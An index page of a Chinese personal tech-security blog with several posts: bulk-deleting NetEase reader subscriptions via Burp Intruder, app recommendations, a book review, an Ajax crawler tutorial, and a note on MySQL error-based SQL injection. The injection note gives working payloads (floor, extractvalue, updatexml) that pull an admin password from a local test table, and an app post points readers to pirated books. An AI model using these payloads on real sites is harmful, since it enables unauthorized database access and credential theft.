
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>Ourren</title>
  <meta name="author" content="ourren">

  
  <meta name="description" content="  关于GoogleReader 最近什么话题最火？这话要是问技术猿或者Geeker，绝对不是苍老师或者小*丽亚出什么新片没，也不是3.15晚会的“网易，央视喊你去做广告”，而是Google决定在7月1日关闭已有7年Google Reader这一震惊的消息，各类论坛社区（v2ex、知乎等）、 &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://blog.ourren.com/blog/posts/7/">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="Ourren" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.useso.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.useso.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.useso.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">Ourren</a></h1>
  
    <h2>关注技术，记录生活.</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="sitesearch" value="blog.ourren.com/blog">
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
    <li><a href="/">Home</a></li>
    <li><a href="http://www.ourren.com">Ourren</a></li>
    <li><a href="http://www.sec-wiki.com">SecWiki</a></li>
    <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div class="blog-index">
  
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/2013/03/16/delete_wangyi_yunyuedu_rss/">批量删除网易云阅读订阅</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2013-03-16T00:00:00-07:00'><span class='date'><span class='date-month'>Mar</span> <span class='date-day'>16</span><span class='date-suffix'>th</span>, <span class='date-year'>2013</span></span> <span class='time'>12:00 am</span></time>
        
        
            | <a href="/2013/03/16/delete_wangyi_yunyuedu_rss/#comments">留言</a>
        
      </p>
    
  </header>


  <div class="entry-content"><h3> <img class="aligncenter" alt="网易云阅读" src="http://ourren.b0.upaiyun.com/wangyiyunyuedu.jpg" width="876" height="222">
</h3>


<h3></h3>


<h3><strong>关于GoogleReader</strong></h3>


<p>最近什么话题最火？这话要是问技术猿或者Geeker，绝对不是苍老师或者小*丽亚出什么新片没，也不是3.15晚会的“网易，央视喊你去做广告”，而是Google决定在7月1日关闭已有7年Google Reader这一震惊的消息，各类论坛社区（v2ex、知乎等）、技术资讯站（cnbeta、虎嗅、36kr等）和个人媒体（月光博客、善用佳软、微信公开平台等）都纷纷讨论：痛骂Google不懂IT民工，不懂互联网；而更多的则是讨论如何选择替代品，导致最近freedly、newsblur、digg、鲜果、有道等等都很忙，不止是服务器很忙，开发人员也很忙。各大公司也纷纷为GR粉提出解决方案，支持一键导入GR源，但是这样子是否能够解决问题呢？</p>

<p>本人虽然使用GR时间较晚（2011年入手），但是现在GR已经成为我日常生活中不可缺少的部分，上班的时候使用GReader Pro同步GR中的文中，下班途中或者闲暇时就拿出来翻阅下，将重要的文章和比较有用的文章加星，以方便第二天抽空时间进行精读，可以说GR与GReader Pro绝配。后来为了方便安全从业者可以分享自己感觉不错的文章，建立了<a href="http://sec-wiki.com" target="_blank">SecWiki</a>，到现在网站已经有收藏1000+文章，但是好景不长，随着GR关闭，这条路暂时关闭，这两天也把国内外这类工具试了个遍，还是没有找到一款好的产品，好在Freedly可能会开放API，GReader Pro貌似会更新、Digg会新开发产品，值得等待。</p>

<h3><strong>删除缘由</strong></h3>


<p>扯了这么多，还没说主题。</p>

<p>网易云阅读是我用来看科技新闻的，软件阅览效果不错，也支持离线下载，这里推荐几个资讯源（36kr、虎嗅、知乎、爱范儿）。今天早上登陆网页版网易云阅读，主动提示可以导入Google Reader订阅栏目了，看到了吧，这两天网易开发人员也没闲着，肯定加班赶产品。手一贱，直接导入原来Google Reader项目，评价下：擦，居然没有给我导入分类信息。然后我打开手机网易云阅读软件，问题就来了，直接显示一千多订阅源，不管有没有更新的都会显示，你让我天天怎么看资讯？果断在微博上@网易云阅读提意见，自己感觉没戏。自己就是搞技术的，果断应该自己去解决，于是打开Google 开发工具（虽然以后不能用GR了，还是可以用chrome吧），抓包看了下取消订阅源的请求数据包，发现有戏，于是有了此文。一来吐槽下google停止GR服务，二来方便跟我犯同样的童鞋。</p>

<h3></h3>


<h3><strong>具体步骤</strong></h3>


<p>工具：burp（不知道的google下）、chrome、notepad++</p>

<p>1、初步分析：登陆网页版网易云阅读，登陆后开启burp代理，并试着删除一个订阅源，查看burp日志可以发现每次删除订阅源只是传递了一个id参数，熟悉burp的都知道可以用intruder功能实现重复提交；</p>

<p><img class="aligncenter" alt="步骤一" src="http://blog.ourren.com/blog/wyyyd_step1.jpg" width="962" height="442"></p>

<p>2、提取参数：如何提取订阅的id，果断使用正则匹配。查看web版网易云阅读的源码，复制后用正则匹配进行匹配，采用正则匹配式：(cst_rss<em>)[a-z0-9</em>]*    并保存为list.txt。</p>

<p><img class="aligncenter" alt="步骤2" src="http://blog.ourren.com/blog/wyyyd_step2.jpg" width="1275" height="661"></p>

<p><img class="aligncenter" alt="步骤2_2" src="http://blog.ourren.com/blog/wyyyd_step3.jpg" width="958" height="513"></p>

<p>3、完工：使用burp的intruder批量实现删除订阅源，将刚测试的burp历史记录发送到intruder选项，添加变量并指定字典，发送。</p>

<p><img class="aligncenter" alt="步骤3" src="http://blog.ourren.com/blog/wyyyd_step4.jpg" width="975" height="366"></p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/2013/03/05/android_apps_and_learn_methods/">浅谈移动平台优秀应用与学习方法</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2013-03-05T00:00:00-08:00'><span class='date'><span class='date-month'>Mar</span> <span class='date-day'>5</span><span class='date-suffix'>th</span>, <span class='date-year'>2013</span></span> <span class='time'>12:00 am</span></time>
        
        
            | <a href="/2013/03/05/android_apps_and_learn_methods/#comments">留言</a>
        
      </p>
    
  </header>


  <div class="entry-content"><p><a href="http://blog.ourren.com/blog/app.jpg"><img alt="移动应用" src="http://ourren.b0.upaiyun.com/app.jpg" width="580" height="209"></a>
      根据摩尔定律：每一美元所能买到的电脑性能，将每隔18个月翻两倍以上，由此可以看到科技更新的速度。同时移动互联网行业也不甘示弱，根据最近的数据显示国内移动终端已经突破4亿，可以想象这是一个多大的市场【1】。移动平台中Android、IOS与WP日益强大，而Symbian、BlackBerry份额逐渐萎缩，而ubuntu、firefox最近又推出移动平台，也想分得移动平台一杯羹（个人比较看好ubuntu）。</p>

<p>科技都在进步，博主不得不跟上时代发展，终于从Nokia转到Android，拥有一部android手机了。在近一个多月的时候和研究中发现一些比较好的应用，这些应用可以辅助个人学习或者丰富日常生活。因此不敢独享，分享给大家（再说这些应用基本上都是免费的，有义务推广下，激励开发者写出更好的应用）。在博文前面也有写个人平时的学习方法可以参考，详见（<a href="http://blog.ourren.com/2012/08/17/personal_learn_method_and_knowledge_manage.html">浅谈个人学习方法与知识管理</a>）。</p>

<ul>
    <li>GTD计划类</li>
</ul>


<p><a href="http://doit.im">Doit.im</a>/<a href="http://any.do">Any.do</a></p>

<p>用于个人的日程安排与提醒，记录平时Idea与个人计划。功能方面差不多，前者免费版有限制，后者则是完全免费的。由于个人手机系统使用any.do会造成死机，暂时使用前者作为计划类应用。</p>

<ul>
    <li>资讯类</li>
</ul>


<p><a href="http://yuedu.163.com/">网易云阅读</a>/<a href="http://www.myzaker.com/">Zaker</a></p>

<p>两者功能和界面基本上都一样，主要用于WIFI离线阅读，然后业余空闲时间或者坐车时浏览，感觉不错的可以收藏然后WEB方式浏览。内容包含以下几类：新闻资讯（新闻头条、南方周刊等）、技术资讯（cnbeta、36kr、虎嗅、爱范儿等）、技术讨论（知乎每日精选等）。</p>

<ul>
    <li>技术类</li>
</ul>


<p>     <a href="https://play.google.com/store/apps/details?id=com.noinnion.android.greader.readerpro&hl=zh_CN">gReader Pro</a> + <a href="http://getpocket.com/">Pocket</a></p>

<p>这里强烈推荐下gReader，作为GR阅读的Android客户端，绝对符合你的胃口，满足你的需求。可以实现离线阅读（自动优化网页阅读效果），并支持加星同步。</p>

<p>Pocket则用于在平时上网中看到不错的网址或者文章，用Pocket Chrome插件收藏，然后利用WIFI同步到手机端。这里之所以推荐Pocket，是因为一些需要翻墙的网页也可以离线。</p>

<ul style="font-family: Georgia, 'Times New Roman', 'Bitstream Charter', Times, serif;">
    <li>书籍类</li>
</ul>


<p><a href="http://www.duokan.com/">多看</a>/<a href="http://www.zhangyue.com/">iReader</a> + <a href="http://www.ireadercity.com/">书香云集</a></p>

<p>用于阅读一些个人传记、生活鸡汤、历史等。特别推荐书香云集，不为别的，<em>只因为盗版书多多，试试就知道</em>。</p>

<ul>
    <li><span style="line-height: 13px;">笔记类</span></li>
</ul>


<p><a href="http://www.evernote.com/">Evernote</a>/<a href="http://note.youdao.com/">有道云笔记</a></p>

<p>用于书写文章，管理优质文章，或者写点小东西同步使用。</p>

<p><em><strong>学习方法</strong></em></p>

<p><em>      因此总的说来，主要是利用WIFI离线功能，提取有用资料；然后善于将碎片时间利用起来学习，达到有效地利用时间。</em></p>

<p><em>参考</em></p>

<ol>
    <li>第31次中国互联网络发展状况统计报告：http://www.cnnic.cn/hlwfzyj/hlwxzbg/hlwtjbg/201301/P020130122600399530412.pdf</li>
</ol>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/2013/02/18/dogs_money_reading_notes/">《小狗钱钱》读书笔记</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2013-02-18T00:00:00-08:00'><span class='date'><span class='date-month'>Feb</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2013</span></span> <span class='time'>12:00 am</span></time>
        
        
            | <a href="/2013/02/18/dogs_money_reading_notes/#comments">留言</a>
        
      </p>
    
  </header>


  <div class="entry-content"><p><img class="aligncenter" alt="小狗钱钱配图" src="http://ourren.b0.upaiyun.com/xiaogou.jpg" width="547" height="232"></p>

<p>过年回家的火车上把《小狗钱钱》看了一遍，虽说书籍也不长，语言也很通俗易懂（毕竟是写给小孩子看的，^_^），但是还是让我对书本所表达的思想有所想，心里有所澎湃（火车上3个小时直接不休息就连着看完了）。书籍讲述的是叫做钱钱的小狗与小女孩吉娅之间的一些事，钱钱帮助吉娅树立信心、制定自己的愿望、挣钱与合理投资等方面指导，总的说来有以下几个方面的收获：</p>

<p> <strong> 1、抓住瞬间想法</strong></p>

<p>      每个人每天都会有很多想法，但是有多少人会记得前段时间自己有过哪些想法。由于人的记忆特征，瞬间的想法最容易被丢失，而很多时候一个瞬间的想法可以改变人生、改变命运，因此，我们需要随时将一些瞬间想法记录下来。这个思想复合GTD的思想，随时将想法丢进收集箱，最好是手机上安装一个GTD软件（例如any.do、wunderlist等免费软件）。</p>

<p><strong> 2、选择最重要的</strong></p>

<p>懂得取舍，选择最重要的。生活中面临很多选择和很多愿望、计划，当面临选择的时候如何进行选择。精力集中在自己能做的、知道的和拥有的东西上，理清哪些对你是最重要的，至少你已经迈出了关键的第一步。</p>

<p><strong>3、时刻提醒自己</strong></p>

<p>有了目标，得时刻提醒自己，比仅仅是让自己主动去提醒自己，也可以制造一些环境让自己被动地提醒。比如在办公桌上放一个去夏威夷旅游的照片时刻提醒你不要忘记你自己的愿望。同时密切关注一切可以帮助你实现这些愿望的机遇了，机遇可遇不可求，一旦失去就不在了。</p>

<p><strong>4、自信些</strong></p>

<p>不管做任何事最关键的因素并不在于你是不是有一个好点子，你有多聪明也不是主要原因，决定因素是你的自信程度。自信是很容易树立的。你想知道应该怎样做吗？？&mdash;&ndash;你拿一本空本子或者一本日记本，给它取名叫做‘成功日记’。然后你就把所有做成功的事情记录进去。你最好每天都做这件事，每次都至少写五条你个人的成果。任何小事都可以。开始的时候也许你觉得不太容易。也许你会问自己，这件或那件事情是否真的可以算作成果。在这种情况下，你永远应该做出肯定的回答。过于自信比不够自信要好得多。</p>

<p><strong>5、善于理财</strong></p>

<p>善于投资与理财，让“鹅”生“蛋”。宽裕的时候进行投资，以防不备。</p>

<p> </p>

<p><em>最后附上钱钱的金钱语录</em></p>

<p>金钱有一些秘密和规律，要想了解这些秘密和规律，前提条件是，你自己必须真的有这个愿望。</p>

<p>如果你只是带着试试看的心态，那么你最后只会以失败而告终，你会一事无成。尝试是一种借口，你还没有做，就已经给自己想好了退路。不能试验，你只有两种选择，做或者不做。
你能否挣到钱，最关键的因素并不在于你是不是有个好点子。你有多聪明也不是主要原因，决定因素是你的自信程度。
你要想清楚你的兴趣所在，然后再考虑如何通过它来挣钱。
你要每天不间断地去做对你未来意义重大的事情。你为此花费的时间不会超过10分钟，但是就是这10分钟会让一切变得不同。
欠债的人应当取消所有的信用卡。
应当尽可能地偿还贷款。
应当将不用于生活的那部分钱中的一半存起来，另一半用于还债。最好根本不要申请消费贷款。
每次借债前先问自己：“这真的有必要吗？”
当你定下了大目标的时候，就意味着你必须付出比别人多得多的努力。
贫穷更让人不幸。
假如我没有了我的“鹅”，我就总是得为了赚钱而工作。但是一旦我有了一只“鹅”，我的钱就会自动为我工作了。
幸运其实只是充分准备加上努力工作的结果。
钱只会留在那些为之付出努力的人的身边。用非法手段取得不义之财的人，反而会比没钱的时候感觉更糟糕。
恐惧总是在我们设想事情会如何不顺的时候出现。我们对失败的可能性想得越多，就越害怕。而当你朝着积极的目标去思考的时候，就不会心生畏惧。
每当冬天过去，春天就来了，接着是夏天，每个夏天之后又跟着是秋天，然后又是冬天，年年如此。跟大自然的变化一样，交易所里也总有四季更替，循环往复。
如果你没有做今天这件事情，你就永远不会知道，给自己一些压力之后，你能够做到写什么。一个人觉得最自豪的事情，是那些做起来最艰难的事情。</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/2012/12/14/learn_ajax_crawl_with_ourren_1/">跟我一起学Ajax爬虫原理（系列1）</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2012-12-14T00:00:00-08:00'><span class='date'><span class='date-month'>Dec</span> <span class='date-day'>14</span><span class='date-suffix'>th</span>, <span class='date-year'>2012</span></span> <span class='time'>12:00 am</span></time>
        
        
            | <a href="/2012/12/14/learn_ajax_crawl_with_ourren_1/#comments">留言</a>
        
      </p>
    
  </header>


  <div class="entry-content"><p>转载请注明：文章出自<a href="http://blog.ourren.com"><a href="http://blog.ourren.com">http://blog.ourren.com</a></a> by ourren</p>

<p>目录
1、引言
2、研究现状
3、论文实例讲解
4、总结
参考文献</p>

<p><strong>1、引言</strong>
随着WEB2.0流行开源，DIV+CSS已经成为网站开发的标配，而Ajax则是在这个中间起着连贯不同页面的粘合剂。这给爬虫开发人员来带来了较大的压力，不管是搜索引擎开发人员，还是我们这些安全屌丝，如何最全面地爬取网站链接和参数已经成为如何优于其他同类产品的优势，比如最近崛起的AISEC扫描器[1]，其主打首款支持AJAX爬虫检测的特点更是在其他安全产品中脱颖而出，受到安全人员的好评，那么AJAX爬虫究竟是如何工作的呢，作者带着这个疑问对相关技术进行了理解，现分享如下。PS，如何你还不知道什么是Ajax、DOM的话，最好Google下（多搜索对你有好处~）。
<strong>2、研究现状</strong>
AJAX，也就是Asychronous Javascript and XML，由于采用了Javascript驱动的异步请求/响应机制，以往的爬虫们缺乏Javascript语义上的理解，基本上是无法模拟触发Javascript的异步调用并解析返回的异步回调逻辑和内容。另外AJAX的应用中，Javascript会对DOM结构进行大量地变动,甚至页面所有的内容都是通过Javascript直接从服务器端读取并动态绘制出来，这个对于“习惯了”DOM结构相对不变的静态页面,简直是无法理解的.由此可以看出,以往的爬虫是基于协议驱动的,而对于AJAX这样的技术，所需要的“爬虫”引擎必须是基于事件驱动的。要实现事件驱动。</p>

<p>学术界发表的相关论文有Crawling Ajax-driven Web 2.0 Applications[3],AJAX Crawl:Making AJAX Applications Searchable[4]等（下个系列再添加）其中第一篇文章中采用的是rbNarcissus（验证和分析Javascript代码，非执行）[5], Watir（一款基于ruby的自动化测试工具，通过代码操作浏览器）[6]，提出了这类爬虫面临这下面三方面的问题：</p>

<ul>
    <li>Javascript分析与Ajax之间的交互</li>
    <li>DOM事件的处理和解释分发</li>
    <li>动态DOM内容语义的创建</li>
</ul>


<p><strong>3、论文实例讲解</strong>
第一篇文章中的作者从三方面解决上面的问题：</p>

<ul>
    <li>如何处理事件驱动的爬虫？</li>
</ul>


<p>例如一个网站的源码是：</p>

<p>[code]&lt;!DOCTYPE html PUBLIC &ldquo;-//W3C//DTD XHTML 1.0 Strict//EN&rdquo;
&ldquo;<a href="http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd</a>&rdquo;>
<html xmlns="http://www.w3.org/1999/xhtml" >
<head>
<title>Dynamic site</title></p>

<script src="./src/master.js"></script>


<script>loadhtml()</script>


<div id='main'></div>


<div id='myarea'></div>


<p></body>
</html> [/code]</p>

<p>很明显，如果基于协议的爬虫是无法爬取该网站的链接和内容的，页面的内容是通过Javascript来动态创建的，而这类创建一般都是通过XHR请求来创建的。</p>

<ul>
    <li>如何分析Javascript代码？</li>
</ul>


<p>我们需要工具来对网页中的Javascript进行分析，看是否调用了XHR，这里就可以用rbNarcissus来进行分析</p>

<p>[code]D:\crawl-ajax> jsparser.rb master.js
&mdash;- XHR call mapping &mdash;-
http.onreadystatechange
getQuote[XHR found]
getPrice
loadmyarea[XHR found]</p>

<h2>loadhtml[XHR found]</h2>

<p>&mdash;- Function mapping &mdash;-
http.onreadystatechange
getQuote
[+]http.onreadystatechange
getPrice
[+]getQuote
loadmyarea
[+]http.onreadystatechange
loadhtml
[+]http.onreadystatechange
&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;[/code]</p>

<p>处理结果发现有XHR调用，并得出了一些内部关联getQuote，loadmyarea和loadhtml，因此就需要浏览器去触发这类行为。</p>

<ul>
    <li>利用IE和Watir进行测试？</li>
</ul>


<p>可以利用一些自动化工具进行测试，为了更好地观察效果，采用irb（命令行交互）进行测试，如何要更好地查看网络通信，可以用burp设置代理。</p>

<p>[code]D:\crawl-ajax> irb &ndash;simple-prompt</p>

<blockquote><blockquote><p>require &lsquo;watir&rsquo;
=> true
include Watir
=> Object
require &lsquo;webtraffic&rsquo;
=> tru[/code]</p></blockquote></blockquote>

<p>新建IE对象</p>

<p>[code]>> ie=IE.new[/code]</p>

<p>请求页面，</p>

<p>[code]>> ie.goto(&ldquo;<a href="http://ajax.example.com">http://ajax.example.com</a>&rdquo;)
=> 4.847[/code]</p>

<p>查看页面链接</p>

<p>[code]>> ie.show_links
index name id href
 text/src
1 Login <a href="http://ajax.example.com/login.asp">http://ajax.example.com/login.asp</a>
2 News <a href="http://ajax.example.com/news.asp">http://ajax.example.com/news.asp</a>
3 Your area Javascript:loadmyarea()</p>

<p>=> nil</p>

<blockquote><blockquote><p>[/code]</p></blockquote></blockquote>

<p>可以看到有三个链接，通过发现一个链接还有JavaScript代码，打开链接3，</p>

<p>[code]>> ie.links[3].html
=> &ldquo;<A href=\"javascript:loadmyarea()\">Your area</A>&rdquo;</p>

<blockquote><blockquote><p>ie.links[3].href
=> &ldquo;javascript:loadmyarea()&rdquo;[/code]</p></blockquote></blockquote>

<p>再次点击页面：</p>

<p>[code]>> ie.links[3].click
=> &ldquo;&rdquo;</p>

<blockquote><blockquote><p>[/code]</p></blockquote></blockquote>

<p>最后这个链接生成了个人页面。</p>

<p>通过前面的技术得到了下面这些链接：</p>

<p>[code]>> ie.show_links
index name id href
 text/src
1 <a href="http://ajax.example.com/login.asp">http://ajax.example.com/login.asp</a>
 Login
2 <a href="http://ajax.example.com/news.asp">http://ajax.example.com/news.asp</a>
 News
3 javascript:loadmyarea()
 Your area
4 <a href="http://ajax.example.com/trade.asp">http://ajax.example.com/trade.asp</a>
 Online trade
5 <a href="http://ajax.example.com/bank.asp">http://ajax.example.com/bank.asp</a>
 Your Bank
6 <a href="http://ajax.example.com/mail.asp">http://ajax.example.com/mail.asp</a>
 Mail
=> nil</p>

<blockquote><blockquote><p>[/code]</p></blockquote></blockquote>

<p>下面继续分析按钮事件：</p>

<p>[code]>> ie.buttons.length
=> 1</p>

<blockquote><blockquote><p>ie.buttons[1].html
=> &ldquo;<INPUT onclick=getPrice(this.form) type=button value=Get name=button>&rdquo;
ie.buttons[1].click
=> &ldquo;&rdquo;
[/code]</p></blockquote></blockquote>

<p>发现这个页面调用了getPrice这个函数,而这个页面又将参数提交到了/myquote.asp这个页面</p>

<p>通过XHR和按钮就把页面所有的内容全部链接抓出来了。</p>

<p><strong>4、本节总结</strong></p>

<p>这节主要对AJAX爬虫的需求出发，阐述了该类爬虫面临的一些困难，并以一篇paper进行阐述其详细过程，通过这个实例相信对整个过程也有一定的了解，下篇文章继续，周末愉快~</p>

<p>参考文献
1）AIScanner <a href="http://www.aisec.cn">http://www.aisec.cn</a>
2）网络爬虫如何抓取web2.0 Ajax页面 <a href="http://blog.minidx.com/2007/10/31/39.html">http://blog.minidx.com/2007/10/31/39.html</a>
3）Crawling Ajax-driven Web 2.0 Applications <a href="http://www.infosecwriters.com/text_resources/pdf/Crawling_AJAX_SShah.pdf">http://www.infosecwriters.com/text_resources/pdf/Crawling_AJAX_SShah.pdf</a>
4）AJAX Crawl: Making AJAX Applications <a href="http://e-collection.library.ethz.ch/eserv/eth:30709/eth-30709-01.pdf">http://e-collection.library.ethz.ch/eserv/eth:30709/eth-30709-01.pdf</a>
5）rbnarcissus <a href="http://code.google.com/p/rbnarcissus/">http://code.google.com/p/rbnarcissus/</a>
6) Watir <a href="http://watir.com/">http://watir.com/</a></p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/2012/11/03/pentest_method_of_mysql_error/">关于Mysql注入过程中的三种报错方式</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2012-11-03T00:00:00-07:00'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>3</span><span class='date-suffix'>rd</span>, <span class='date-year'>2012</span></span> <span class='time'>12:00 am</span></time>
        
        
            | <a href="/2012/11/03/pentest_method_of_mysql_error/#comments">留言</a>
        
      </p>
    
  </header>


  <div class="entry-content"><p>放点原来的笔记，Mysql在执行语句的时候会抛出异常信息信息，而php+mysql架构的网站往往又将错误代码显示在页面上，这样可以通过构造如下三种方法获取特定数据。</p>

<p>实际测试环境：</p>

<p>[code]mysql> show tables;
+&mdash;&mdash;&mdash;&mdash;&mdash;-+
| Tables_in_test |
+&mdash;&mdash;&mdash;&mdash;&mdash;-+
| admin          |
| article        |
+&mdash;&mdash;&mdash;&mdash;&mdash;-+[/code]</p>

<p> </p>

<p>[code]
mysql> describe admin;
+&mdash;&mdash;-+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;+&mdash;&ndash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;-+
| Field | Type             | Null | Key | Default | Extra          |
+&mdash;&mdash;-+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;+&mdash;&ndash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;-+
| id    | int(10) unsigned | NO   | PRI | NULL    | auto_increment |
| user  | varchar(50)      | NO   |     | NULL    |                |
| pass  | varchar(50)      | NO   |     | NULL    |                |
+&mdash;&mdash;-+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;+&mdash;&ndash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;-+[/code]</p>

<p> </p>

<p>[code]
mysql> describe article;
+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;+&mdash;&ndash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;-+
| Field   | Type             | Null | Key | Default | Extra          |
+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;+&mdash;&ndash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;-+
| id      | int(10) unsigned | NO   | PRI | NULL    | auto_increment |
| title   | varchar(50)      | NO   |     | NULL    |                |
| content | varchar(50)      | NO   |     | NULL    |                |
+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;+&mdash;&ndash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;-+[/code]</p>

<p>1、通过floor报错</p>

<p>可以通过如下一些利用代码</p>

<p>[code]and select 1 from (select count(<em>),concat(version(),floor(rand(0)</em>2))x
from information_schema.tables group by x)a);[/code]
[code]and (select count(<em>) from (select 1 union select null union select !1)x
group by concat((select table_name from information_schema.tables limit 1),
floor(rand(0)</em>2)));[/code]</p>

<p>举例如下：
首先进行正常查询：</p>

<p>[code]mysql> select * from article where id = 1;
+&mdash;-+&mdash;&mdash;-+&mdash;&mdash;&mdash;+
| id | title | content |
+&mdash;-+&mdash;&mdash;-+&mdash;&mdash;&mdash;+
|  1 | test  | do it   |
+&mdash;-+&mdash;&mdash;-+&mdash;&mdash;&mdash;+[/code]</p>

<p>假如id输入存在注入的话，可以通过如下语句进行报错。</p>

<p>[code]mysql> select * from article where id = 1 and (select 1 from
(select count(<em>),concat(version(),floor(rand(0)</em>2))x from information_schema.tables group by x)a);
ERROR 1062 (23000): Duplicate entry &lsquo;5.1.33-community-log1&rsquo; for key &lsquo;group_key&rsquo;[/code]</p>

<p>可以看到成功爆出了Mysql的版本，如果需要查询其他数据，可以通过修改version()所在位置语句进行查询。
例如我们需要查询管理员用户名和密码：
Method1:</p>

<p>[code]mysql> select * from article where id = 1 and (select 1 from
(select count(<em>),concat((select pass from admin where id =1),floor(rand(0)</em>2))x
from information_schema.tables group by x)a);
ERROR 1062 (23000): Duplicate entry &lsquo;admin8881&rsquo; for key &lsquo;group_key&rsquo;[/code]</p>

<p>Method2:</p>

<p>[code]mysql> select * from article where id = 1 and (select count(<em>)
from (select 1 union select null union select !1)x group by concat((select pass from admin limit 1),
floor(rand(0)</em>2)));
ERROR 1062 (23000): Duplicate entry &lsquo;admin8881&rsquo; for key &lsquo;group_key&rsquo;[/code]</p>

<p>2、ExtractValue
测试语句如下</p>

<p>[code]and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));[/code]</p>

<p>实际测试过程</p>

<p>[code]mysql> select * from article where id = 1 and extractvalue(1, concat(0x5c,
(select pass from admin limit 1)));&ndash;
ERROR 1105 (HY000): XPATH syntax error: &lsquo;\admin888&rsquo;[/code]</p>

<p>3、UpdateXml
测试语句</p>

<p>[code]and 1=(updatexml(1,concat(0x5e24,(select user()),0x5e24),1))[/code]</p>

<p>实际测试过程</p>

<p>[code]mysql> select * from article where id = 1 and 1=(updatexml(1,concat(0x5e24,
(select pass from admin limit 1),0x5e24),1));
ERROR 1105 (HY000): XPATH syntax error: &lsquo;^$admin888^$&rsquo;[/code]</p>

<p>All, thanks foreign guys.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/2012/10/25/naive_bayes_algorithm_for_data_mining/">数据挖掘之朴素贝叶斯算法</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2012-10-25T00:00:00-07:00'><span class='date'><span class='date-month'>Oct</span> <span class='date-day'>25</span><span class='date-suffix'>th</span>, <span class='date-year'>2012</span></span> <span class='time'>12:00 am</span></time>
        
        
            | <a href="/2012/10/25/naive_bayes_algorithm_for_data_mining/#comments">留言</a>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Author:youstar</p>

<p>Blog:<a href="http://blog.ourren.com/"><a href="http://blog.ourren.com">http://blog.ourren.com</a></a></p>

<p>最近由于需求翻阅了一些数据挖掘相关资料，对数据挖掘过程中的分类技术进行了理解和研究，遂记录如下。</p>

<p><strong>1、数据挖掘概述</strong></p>

